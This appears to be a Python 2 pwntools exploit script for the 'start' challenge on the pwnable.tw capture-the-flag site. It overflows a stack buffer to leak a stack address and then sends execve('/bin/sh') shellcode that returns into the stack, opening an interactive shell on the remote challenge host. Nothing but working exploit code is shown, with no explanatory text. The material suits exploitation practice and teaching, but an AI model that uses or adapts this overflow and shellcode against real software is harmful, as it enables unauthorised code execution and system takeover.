#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./Downloads/start')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break _start
'''.format(**locals())
 
write = 0x08048087

payload = 'A'*0x14 + p32(write)

io = start()
io.recv()
#io.recv()
io.send(payload)
leak = unpack(io.recv()[0:4],32)
log.info("Leak : %s" % hex(leak))

shellcode = asm('''
        push 0x0068732f
        push 0x6e69622f
        mov eax,0xb
        xor ecx,ecx
        xor edx,edx
        lea ebx,[esp]
        int 0x80
        ''')

payload = 'A'*0x14 + p32(leak+20) 
payload += shellcode #+ '\x90'*20

io.send(payload)

io.interactive()
